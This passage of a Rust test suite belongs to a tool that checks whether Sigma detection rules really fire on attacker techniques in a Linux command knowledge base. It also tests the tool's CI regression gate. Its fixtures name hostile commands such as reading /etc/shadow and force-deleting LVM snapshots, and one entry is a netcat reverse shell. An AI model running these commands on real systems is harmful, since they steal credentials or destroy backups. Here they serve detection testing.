        assert_eq!(a, &result_for(&again, "nc-revsh").not_firing);
        let mut sorted = a.clone();
        sorted.sort();
        assert_eq!(a, &sorted);
    }

    #[test]
    fn an_entry_with_no_rules_names_nothing() {
        // NO-RULE means nothing was asked, so there is nothing to report — the
        // empty list must not be confused with "asked and everything declined".
        let kb = kb_of(vec![entry("whoami", Some("whoami"), None, "T9999")]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "whoami");
        assert_eq!(r.status, Status::NoRule);
        assert!(r.not_firing.is_empty());
    }

    /// The display cap must not reach the verdict. Six same-level rules share
    /// T1490 in the fixtures, and only the sixth — ordered last on title —
    /// fires. Drawing candidates from the capped list would report this claim
    /// as contradicted while the rule proving it sat one slot out of view.
    #[test]
    fn a_rule_past_the_display_cap_still_verifies_the_claim() {
        let kb = kb_of(vec![entry(
            "lv-remove",
            None,
            Some("lvremove --force /dev/vg0/snap"),
            "T1490",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "lv-remove");
        assert_eq!(r.status, Status::Verified);
        assert_eq!(r.firing, vec!["Zebra Snapshot Deletion".to_string()]);
    }

    /// The distinction the `NotApplicable` status exists to draw. Both rules
    /// key on a field a command line cannot supply, but only one of them was
    /// ever asking about a process execution.
    #[test]
    fn a_rule_for_another_event_class_is_not_applicable_not_indeterminate() {
        // The shadow fixture is `category: file_event`. No amount of extra
        // process telemetry would let it fire on a command, so calling it
        // indeterminate overstates what we are abstaining from.
        let kb = kb_of(vec![entry(
            "shadow",
            None,
            Some("cat /etc/shadow"),
            "T1003.008",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "shadow");
        assert_eq!(r.status, Status::NotApplicable);
        assert_eq!(r.because.inapplicable_rules, 1);
    }

    /// The other side of the same coin. The entry above cannot answer a
    /// `file_event` rule because it only models a command; this one models the
    /// file record too, so the rule that was set aside gets asked after all.
    #[test]
    fn an_event_axis_verifies_a_rule_in_its_own_logsource() {
        let kb = kb_of(vec![event_entry(
            "shadow",
            None,
            Some("cat /etc/shadow"),
            "T1003.008",
            r#"{"class": "file", "field": "TargetFilename", "eq": "/etc/shadow"}"#,
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "shadow");
        assert_eq!(r.status, Status::Verified);
        assert_eq!(r.firing, vec!["Access To /etc/shadow File".to_string()]);
    }

    /// An entry recognized only by an event carries no command line at all. The
    /// old code returned `Indeterminate` with `no_representative` before ever
    /// reaching the rule; there is no process rule here to want a line.
    #[test]
    fn an_event_only_entry_is_answerable() {
        let kb = kb_of(vec![event_entry(
            "shadow-ev",
            None,
            None,
            "T1003.008",
            r#"{"class": "file", "field": "TargetFilename", "eq": "/etc/shadow"}"#,
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "shadow-ev");
        assert_eq!(r.status, Status::Verified);
        assert!(!r.because.no_representative);
    }

    /// The hazard the partition exists to prevent, and the reason the gate is
    /// the class *matching the axis* rather than "the entry has an event axis".
    /// A registry entry must not be credited by a file rule.
    #[test]
    fn a_rule_of_another_event_class_is_still_set_aside() {
        let kb = kb_of(vec![event_entry(
            "shadow",
            None,
            Some("cat /etc/shadow"),
            "T1003.008",
            r#"{"class": "registry", "field": "TargetObject", "contains": "\\Run"}"#,
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "shadow");
        assert_eq!(r.status, Status::NotApplicable);
        assert_eq!(r.because.inapplicable_rules, 1);
    }

    /// The record is evaluated, not assumed. An event axis pointed somewhere the
    /// rule does not look contradicts the claim rather than proving it.
    #[test]
    fn an_event_axis_the_rule_does_not_match_is_unverified() {
        let kb = kb_of(vec![event_entry(
            "gshadow",
            None,
            None,
            "T1003.008",
            r#"{"class": "file", "field": "TargetFilename", "eq": "/etc/gshadow"}"#,
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(result_for(&report, "gshadow").status, Status::Unverified);
    }

    /// Event rules are evaluated against the record alone — no command line is
    /// synthesized underneath it — so a rule keyed on the writing process
    /// abstains instead of being answered with an `Image` from a different log
    /// source. The file-event twin of the `ParentImage` case above.
    #[test]
    fn an_event_rule_needing_a_field_the_record_lacks_stays_indeterminate() {
        let kb = kb_of(vec![event_entry(
            "crontab",
            None,
            None,
            "T1053.003",
            r#"{"class": "file", "field": "TargetFilename", "eq": "/etc/crontab"}"#,
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "crontab");
        assert_eq!(r.status, Status::Indeterminate);
        assert_eq!(r.because.missing_fields, vec!["Image".to_string()]);
        assert_eq!(r.because.inapplicable_rules, 0);
    }

    #[test]
    fn a_process_creation_rule_needing_a_field_stays_indeterminate() {
        // The sshd fixture IS `category: process_creation`; it just needs
        // ParentImage, which real telemetry could supply. That is a genuine
        // abstention and must not be swept into "not applicable".
        let kb = kb_of(vec![entry("whoami", None, Some("whoami"), "T1552.001")]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "whoami");
        assert_eq!(r.status, Status::Indeterminate);
        assert_eq!(r.because.missing_fields, vec!["ParentImage".to_string()]);
        assert_eq!(r.because.inapplicable_rules, 0);
    }

    #[test]
    fn no_rule_when_technique_absent_from_ruleset() {
        // T1033 has no rule in the tiny fixture set.
        let kb = kb_of(vec![entry("whoami", Some("whoami"), None, "T1033")]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(result_for(&report, "whoami").status, Status::NoRule);
    }

    #[test]
    fn only_entries_with_a_sigma_claim_are_verified() {
        let mut with_claim = entry("claimed", Some("whoami"), None, "T1033");
        let mut no_claim = entry("unclaimed", Some("ls"), None, "T1083");
        no_claim.detections.clear(); // no Sigma claim → skipped
        with_claim.detections.push(Detection {
            source: "Custom".into(),
            rule: "internal".into(),
            confidence: "low".into(),
            verdict: None,
        });
        let kb = kb_of(vec![with_claim, no_claim]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(report.results.len(), 1);
        assert_eq!(report.results[0].id, "claimed");
        assert!(report.results.iter().all(|r| !r.claimed.is_empty()));
    }

    #[test]
    fn real_kb_verifies_without_panicking() {
        // Smoke test against the shipped KB + fixtures: every claiming entry is
        // classified, results carry claimed rule names, counts add up.
        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let claimed = kb.entries.iter().filter(|e| claims_sigma(e)).count();
        assert_eq!(report.results.len(), claimed);
        assert!(report.results.iter().all(|r| !r.claimed.is_empty()));
        let sum = report.count(Status::Verified)
            + report.count(Status::Unverified)
            + report.count(Status::Indeterminate)
            + report.count(Status::NoRule)
            + report.count(Status::NotApplicable);
        assert_eq!(sum, report.results.len());
    }

    /// The cause breakdown drives what someone works on next, so it has to be
    /// stable run to run. `sort_by_key` is a *stable* sort (`sort_unstable_by`
    /// is the reordering one), and rows are pushed in a fixed sequence, so ties
    /// keep that sequence rather than varying. Asserted rather than assumed.
    #[test]
    fn cause_breakdown_is_ranked_and_deterministic_on_ties() {
        let mk = |id: &str, because: IndeterminateCause| VerifyResult {
            id: id.into(),
            description: format!("{id} desc"),
            techniques: vec!["T1000".into()],
            claimed: vec!["some rule".into()],
            status: Status::Indeterminate,
            firing: vec![],
            not_firing: vec![],
            because,
        };
        let modifier_only = IndeterminateCause {
            modifiers: vec!["windash".into()],
            ..Default::default()
        };
        let field_only = IndeterminateCause {
            missing_fields: vec!["ParentImage".into()],
            ..Default::default()
        };
        let report = VerifyReport {
            platform: "windows".into(),
            sigma_ref: None,
            rules_indexed: 10,
            // One entry per cause: a deliberate tie at 1 each.
            results: vec![mk("a", modifier_only), mk("b", field_only)],
        };

        let first = summarize_causes(&report);
        assert_eq!(
            first.iter().map(|r| (r.0, r.1)).collect::<Vec<_>>(),
            vec![("modifiers", 1), ("missing fields", 1)],
            "tied rows keep their push order"
        );
        // Same input must give the same answer every time.
        for _ in 0..8 {
            assert_eq!(summarize_causes(&report), first);
        }

        // And a clear winner must actually outrank a tie.
        let mut skewed = report.clone();
        skewed.results.push(mk(
            "c",
            IndeterminateCause {
                missing_fields: vec!["ParentImage".into()],
                ..Default::default()
            },
        ));
        let ranked = summarize_causes(&skewed);
        assert_eq!(ranked[0].0, "missing fields");
        assert_eq!(ranked[0].1, 2);
    }

    /// The provenance field is additive: a baseline committed before it existed
    /// has to keep working, or pinning the ruleset would silently invalidate
    /// every saved report and turn the regression gate into an exit-2 error.
    #[test]
    fn baseline_without_sigma_ref_still_deserializes() {
        let older = r#"{
            "platform": "linux",
            "rules_indexed": 251,
            "results": [
                {
                    "id": "arp",
                    "description": "ARP cache enumeration",
                    "techniques": ["T1018"],
                    "claimed": ["Remote system discovery utility"],
                    "status": "unverified"
                }
            ]
        }"#;
        let report: VerifyReport = serde_json::from_str(older).expect("older baseline must load");
        assert_eq!(report.sigma_ref, None);
        assert_eq!(report.rules_indexed, 251);
        assert_eq!(report.results.len(), 1);

        // And a report that names no ref must not invent the key on the way
        // back out — an absent provenance stays absent rather than becoming a
        // null someone could mistake for a recorded value.
        let round_tripped = render_json(&report);
        assert!(
            !round_tripped.contains("sigma_ref"),
            "an unnamed ref must be omitted, not serialized as null: {round_tripped}"
        );
    }

    #[test]
    fn render_names_the_ruleset_revision_only_when_known() {
        let base = VerifyReport {
            platform: "linux".into(),
            sigma_ref: None,
            rules_indexed: 251,
            results: vec![],
        };
        let anonymous = render(&base, false);
        assert!(
            anonymous.contains("251 rules indexed)"),
            "no ref means no provenance clause: {anonymous}"
        );
        assert!(!anonymous.contains(" @ "));

        let pinned = VerifyReport {
            sigma_ref: Some("3c0d35188942eb6a8c373e4f4973ac7e84116993".into()),
            ..base.clone()
        };
        let named = render(&pinned, false);
        assert!(
            named.contains("251 rules indexed @ 3c0d35188942)"),
            "a 40-hex commit id abbreviates to 12 chars in the header: {named}"
        );

        // A ref that is not a commit id has no safe truncation point, so it is
        // shown whole rather than cut to a length that means nothing.
        let tagged = VerifyReport {
            sigma_ref: Some("r2026-08-05".into()),
            ..base
        };
        assert!(render(&tagged, false).contains("@ r2026-08-05)"));
    }

    #[test]
    fn delta_flags_regression_and_improvement() {
        let baseline = report_of(vec![
            vr("a", Status::Verified),   // will regress
            vr("b", Status::Unverified), // will improve
            vr("c", Status::Verified),   // unchanged
        ]);
        let current = report_of(vec![
            vr("a", Status::Unverified),
            vr("b", Status::Verified),
            vr("c", Status::Verified),
        ]);
        let delta = compute_delta(&baseline, &current);
        assert!(delta.has_regressed());
        assert_eq!(delta.regressions.len(), 1);
        assert_eq!(delta.regressions[0].id, "a");
        assert_eq!(delta.improvements.len(), 1);
        assert_eq!(delta.improvements[0].id, "b");
        assert!(delta.fails_gate());
    }

    #[test]
    fn delta_flags_vanished_verified_entry() {
        // A previously-verified entry missing from the current run must count as
        // a regression, not silently pass the gate.
        let baseline = report_of(vec![
            vr("gone", Status::Verified),
            vr("stay", Status::Verified),
        ]);
        let current = report_of(vec![vr("stay", Status::Verified)]);
        let delta = compute_delta(&baseline, &current);
        assert!(delta.has_regressed());
        assert_eq!(delta.regressions.len(), 1);
        assert_eq!(delta.regressions[0].id, "gone");
        assert_eq!(delta.regressions[0].to, Status::Removed);
        // A removal is a regression, never a new claim.
        assert!(delta.introduced.is_empty());
        assert!(delta.fails_gate());
    }

    #[test]
    fn delta_flags_a_new_unverified_claim() {
        // The hole this gate closes: a claim added by a change has no baseline
        // row, so the old `by_id` lookup missed it and it passed CI silently.
        let baseline = report_of(vec![vr("a", Status::Verified)]);
        let current = report_of(vec![vr("a", Status::Verified), vr("b", Status::Unverified)]);
        let delta = compute_delta(&baseline, &current);
        // It is not a regression — nothing fell. The two stay distinguishable.
        assert!(!delta.has_regressed());
        assert_eq!(delta.introduced.len(), 1);
        assert_eq!(delta.introduced[0].id, "b");
        assert_eq!(delta.introduced[0].status, Status::Unverified);
        assert!(delta.has_unsubstantiated_additions());
        assert!(delta.fails_gate());
    }

    #[test]
    fn a_new_claim_that_verifies_is_reported_but_does_not_fail() {
        // Worth saying (the committed baseline is now stale) without being a
        // build failure.
        let baseline = report_of(vec![vr("a", Status::Verified)]);
        let current = report_of(vec![vr("a", Status::Verified), vr("c", Status::Verified)]);
        let delta = compute_delta(&baseline, &current);
        assert!(!delta.fails_gate());
        assert!(!delta.is_empty());
        assert!(!render_delta(&delta, false).contains("no change"));
    }

    #[test]
    fn delta_flags_a_worsening_that_never_touched_verified() {
        // The other half of the hole: both of these were invisible when the
        // test was `baseline == Verified && current != Verified`.
        let baseline = report_of(vec![
            vr("b", Status::NoRule),
            vr("d", Status::Indeterminate),
        ]);
        let current = report_of(vec![
            vr("b", Status::Unverified),
            vr("d", Status::Unverified),
        ]);
        let delta = compute_delta(&baseline, &current);
        assert_eq!(delta.regressions.len(), 2);
        assert_eq!(delta.regressions[0].from, Status::NoRule);
        assert_eq!(delta.regressions[1].from, Status::Indeterminate);
        assert!(delta.fails_gate());
    }

    #[test]
    fn a_deleted_unverified_claim_is_not_a_regression() {
        // This is how a refuted claim gets fixed: withdraw it. A gate that
        // punished the withdrawal would block its own remedy.
        let baseline = report_of(vec![
            vr("gone", Status::Unverified),
            vr("stay", Status::Verified),
        ]);
        let current = report_of(vec![vr("stay", Status::Verified)]);
        let delta = compute_delta(&baseline, &current);
        assert!(!delta.has_regressed());
        assert!(delta.introduced.is_empty());
        assert!(!delta.fails_gate());
        assert_eq!(delta.baseline_unverified, 1);
        assert_eq!(delta.current_unverified, 0);
    }

    #[test]
    fn a_status_move_at_equal_rank_is_neither() {
        // `NoRule` and `NotApplicable` both rank 1: nobody answered, for two
        // different reasons. Moving between them is not news.
        let baseline = report_of(vec![vr("a", Status::NoRule)]);
        let current = report_of(vec![vr("a", Status::NotApplicable)]);
        let delta = compute_delta(&baseline, &current);
        assert!(delta.regressions.is_empty());
        assert!(delta.improvements.is_empty());
        assert!(!delta.fails_gate());
    }

    #[test]
    fn escaping_unverified_into_no_rule_is_not_an_improvement() {
        // Re-pointing an entry at a technique nothing covers lowers the
        // unverified count without proving anything. It must not read as
        // progress — this is why `improvements` is not the rank mirror of
        // `regressions`.
        let baseline = report_of(vec![vr("a", Status::Unverified)]);
        let current = report_of(vec![vr("a", Status::NoRule)]);
        let delta = compute_delta(&baseline, &current);
        assert!(delta.improvements.is_empty());
        assert!(delta.regressions.is_empty());
        assert!(!render_delta(&delta, false).contains("VERIFIED"));
    }

    #[test]
    fn the_unverified_count_is_reported_on_both_sides() {
        let baseline = report_of(vec![
            vr("a", Status::Unverified),
            vr("b", Status::Unverified),
        ]);
        let current = report_of(vec![vr("a", Status::Verified), vr("b", Status::Unverified)]);
        let delta = compute_delta(&baseline, &current);
        assert_eq!(delta.baseline_unverified, 2);
        assert_eq!(delta.current_unverified, 1);
        assert!(render_delta(&delta, false).contains("2 → 1 unverified"));
    }

    #[test]
    fn render_delta_tells_a_regression_apart_from_a_new_claim() {
        let baseline = report_of(vec![vr("fell", Status::Verified)]);
        let current = report_of(vec![
            vr("fell", Status::Unverified),
            vr("fresh", Status::Unverified),
        ]);
        let delta = compute_delta(&baseline, &current);
        let out = render_delta(&delta, false);
        assert!(out.contains("REGRESSED"));
        assert!(out.contains("NEW CLAIM"));
        // The new claim names no transition, because none happened.
        assert!(out.contains("fresh (UNVERIFIED — no baseline entry)"));
    }

    #[test]
    fn gate_reason_names_every_failing_class() {
        let baseline = report_of(vec![vr("fell", Status::Verified)]);
        let current = report_of(vec![
            vr("fell", Status::Unverified),
            vr("fresh", Status::Unverified),
        ]);
        let delta = compute_delta(&baseline, &current);
        let why = delta.gate_reason();
        assert!(why.contains("1 detection(s) got worse"), "{why}");
        assert!(why.contains("1 new claim(s)"), "{why}");
        assert!(why.contains("unverified count rose from 0 to 2"), "{why}");
    }
}
